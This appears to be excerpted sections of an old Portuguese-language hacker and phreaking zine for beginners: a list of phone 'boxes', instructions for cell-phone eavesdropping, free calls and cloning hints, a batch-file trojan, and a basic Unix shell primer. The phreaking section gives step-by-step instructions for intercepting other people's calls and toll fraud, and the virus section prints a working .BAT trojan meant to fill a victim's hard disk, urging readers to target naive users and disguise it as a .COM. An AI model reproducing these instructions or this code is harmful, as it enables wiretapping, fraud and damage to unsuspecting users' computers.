4. Boxes
	Para começar... Boxes são qualquer dispositivos ou esquemas de ligação, que permita ao phreaker obter vantagem ou comodidade dos sistemas Telefonicos. 
	Começei a minha pesquisa hoje. Dei uma lida no zine Hack n' Phreak e encontrei algumas coisas. Tb lí uns outros textos e fiz uma pequena listinha sobre as boxes. Uma das principais fontes foi o texto de telefonia escrito por Ton Waits para o B.H.J(Brasilian Hackers Journal).

* Aero Box : Com ela é possivel fazer chamadas nacionais e internacionais
* Beige Box : Como aqueles que os técnicos usam nos postes.
* Black Box : Ela faz com que as pessoas que liguem para a sua casa não sejam 	      cobradas pela ligação. Ps: funciona aqui no Brasil mas não faça
	      da sua residencia.
* Blast Box : Amplificador de microfone do telefone.
* Blue Box : com ela é possivel controlar simplesmente o sistema telefonico
 	     inteiro, mandando um sinal de 2600Hz para a central, desde que 
	     ele seja baseado em CT's Centrais Telefonicas) digitais, o que 
	     nao é o caso do Brasil, que utiliza CT's eletromecanicas.
* Brown Box : Cria um sistema de party-fone a partir das linhas existentes.
* Bud Box : Intervem no telefone de outra linha.
* Busy Box : Não permite que a linha seja utilizada nem pra receber nem pra 	     enviar chamadas.
* Chrome Box : Manipula sinais de trafego atraves de um sistema remoto.
* Color Box : Grava conversas. 
* Copper Box : Causa interferencias na linha. O chamado linha-cruzada.
* Crimson: Permite que o telefone seja bloqueado por um botão.
* Dark Box : Redireciona as chamadas pra um outro telefone.
* Ditto Box : Interfere nas linhas permitindo as escutas telefonicas.
* Divertor Box : Redireciona as chamadas.
* Gold Box : Permite rastrear uma chamada.
* Infinity Box : Intervencao remota de chamadas.
* Jack Box : Jogo de tons.
* Light Box : Emissor AM.
* Magenta Boxes : Elas fazem com que voce chame um numero e depois a chamada
 		  é automaticamente transferida para a linha de algum outro
		  coitado que pagará por qualquer ligação que voce faça. Ps: 
		  Tb funcionam aqui no Brasil.
* Neon Box : Microfone externo.
* New Gold Box : Versão atualizada da Gold Box
* Noise Box : Cria na linha um barulho.
* Party Box : Cria um part-fone a partir de duas linhas.
* Pearl Box : Gerador de tons.
* Pink Box : Cria um part-fone.
* Purple Box : Permite que o telefone seja bloqueado.
* Rainbow : Elimina um rastreamento da chamada enviando 120 volts pela linha.
* Rex/red box : Emite tons para ligar gratis de orelhoes
* Rock Box : Toca musiquinha quando você aperta um botão.
* Silver Box : Cria DTMF tons de prioridade A, B, C e D na linha.
* Snow Box : Emite por TV clandestinamente.
* Static Box : Eleva a voltagem da linha.
* Switch Box : Permite um gerenciamento visual das linhas telefonicas de sua 	       residencia.
* Tan Box : Gravador de conversas telefonicas.
* Urine Box : Cria alteracoes no microfone.
* Yellow Box : Adiciona uma extensao.

	Tome cuidado com os ESS (Eletronic Switching System). Este sistema monitora simplesmente tudo o que acontece nas linhas telefonicas. Todo o numero que voce digita, mesmo se for engano, pra onde voce liga, a que horas, simplesmente tudo. São raros e encontrados apenas na minoria dos telefones publicos dos EUA.
	É, isso foi tudo o que eu consegui. As próximas edições terão umas matérias de como fazer a Black Box e a Busy Box.

5. Phreaking
	Nesta edição mostrairei como burlar celulares com todos os detalhes. Você talvés já tenha lido isso em algum lugar mas vale a pena complementar como funciona cada instrução.

***Fazendo escutas***
	Você deve deixar o celular em modo de programação. Para isso retire a bateria, repare uns 3 encaixes metalicos no celular, coloque um pedaço de papel laminado no encaixe do meio(neutro). Agora recoloque a bateria.
	Agora ao religar o celular você terá que reprograma-lo. Então digite:

# 08 # 11 XXXX #

Onde:
#08 	:	Liga o audio de RX (Receptor);
#11 	:	Ajusta canal de funcionamento do transreceptor;
XXXX 	:	Numero do canal.

	O numero do canal pode variar de 0 a 800, pode ser mais mas é difícil	encontrar alguém conversando num canal acima de 800. Vá mudando o canal até encontrar alguma conversa.

***Ligações gratuitas***
	Pegue o numero que você vai discar e diminua o ultimo numero de 10. Depois adicione este numero ao final do numero original.
Ex:
	987-1234 (numero original)
	10 menos 4 = 6
	987-1234 # 6 (novo numero)

	Outra manha é apenas para celulares da motorola. Faça o seguinte: Ao ligar o celular aperte o botão "FCN", depois sete vezes o 0(zero), depois uma vez o 4(quatro) e para finalizar o "STO" e pronto... Você pode ligar com o custo de ligação normal até desligar o celular... 


***Clonagem de celulares***
	Eu espero antes de acabar a edição conseguir algo detalhado sobre o que colocar aki. Caso eu não consigua você vai estar lendo está frase agora. Então uma dica é ler o motorola bible e aprender a programar o NAM que é um chip de programação com memória ROM.

6. VIRII
	Como esse zine é dirigido a newbies que talvés não saibam ainda programar nada ou quase nada. Aqui vai uma fonte de um Trojam em .BAT que vai encher o hd do user infectado.
	ATENÇÃO! O user não precisa ter um vasto conhecimento em informatica para descobrir esse prog. Por isso tenha certeza de que o usuário que será infectado seja totalmente LAMER!
	Outra coisa boa para se fazer é pegar um programinha que transforma files .BAT em .COM, uns bons exemplos são BATCOM, BAT2EXE e TURBOBAT. Até agora eu só usei o BATCOM e apenas ouvi falar nos outros dois.

-------Recorte Aqui----------------------------------------------------------

REM   Salve este arquivo como LIXO.BAT ou qualquer outro nome.BAT
REM   Os comandos desse programinha foram retirados do zine Rnet e não foram 
REM modificados. Com exeção desses 3 REM's :)
@ECHO OFF
DIR >> ENCHE
:ENCHE
TYPE ENCHE >> ENCHE
CLS
ECHO ENCHENDO AGUARDE...
GOTO ENCHE

9. Hack, the art
	Você já deve ter lido aqueles zines que dizem que a primeira coisa que você deve fazer para chegar a ser um hacker é usar um sistema operacional bom, no momento o melhor é o UNIX.
	Mas esqueça um pouco isso... Antes de partir para o unix você deve entender como ele funcina. E nada melhor do que aprender na pratica. Por isso eu aconselho a vocês leitores newbies a ficarem um pouco com o Windows e depois que aprenderem +/- como usar o unix, instalem o UNIX.
	A primeira coisa q você deve fazer é pegar um emulador de unix ou usar uma conta shell em um provedor. O emulador você pode conseguir na hp conscience(ver lista de pesquisa hacking). Mas o meu conselho é usar o telnet em uma conta shell.
	Você talvez não saiba o que é telnet então aí vai uma rapida explicação: Telnet resumidamente é usar o SO servidor(na maioria das vezes UNIX). O telnet funciona na porta 23, e é a melhor maneira para exercitar os seus conhecimentos em unix. Porém vc precissa estar online para isso, enquanto o emulador funciona offline.
	Você precissa saber o host do servidor(é claro), após conectar-se abrirá um pedido de login. Se você está se conectando com seu próprio provedor você pode usar o mesmo login. Se não, é bom se cadastrar ou conseguir uma lista de senhas com um camarada no IRC. Depois use o password da mesma conta e pronto. 
	Agora você entrou na sua conta shell do servidor. As shells são interpretadores de comandos. Você pode editar nessa mesma conta shell.	Exemplo: Você gostaria de sempre que você se conecta-se mostra-se o diretório corrente. Então no final do shell você acressentaria o comando pwd.
	Entendeu? Funciona como o arquivo autoexec.bat do dos.
	Para você ter uma idéia...a shell para acesso a internet de alguns provedores é bsh. Um shell utilizado por programadores é o csh, que permite que você entre com comandos em c. O vsh é um shell que exibe menus, algo tipo windows. O rsh é tipo um shell restrito, usado muito em servidores FTP quando o user se loga como anonymous. E por ultimo o sh, é o shell básico do unix, tem uma linguagem em script, como muitos do interpretadores de comandos no UNIX.
	Para entender melhor como funciona o UNIX, aqui vai uns comandos que certamente você vai usar:

cd		'Muda o dir. Como no MS-DOS.
ls		'Lista files e dirs no diretório atual. acresente -l para 
		 obter mais informações sobre os files. Funciona como o 		 comando DIR no MS-DOS.
mv		'Move o file, Também serve para renomear.
cp		'Copia file de uma origem para um destino. Funciona como COPY 		 no MS-DOS.
rm		'Deleta um file. Funciona como o DEL no MS-DOS.
mkdir		'Cria um novo dir. Funciona como o MD no MS-DOS.
rmdir		'Remove um dir. Funciona com o RD no MS-DOS.
pwd		'Mostra o dir corrente.
cat		'Mostra o conteudo de um file. Como o TYPE do MS-DOZE.
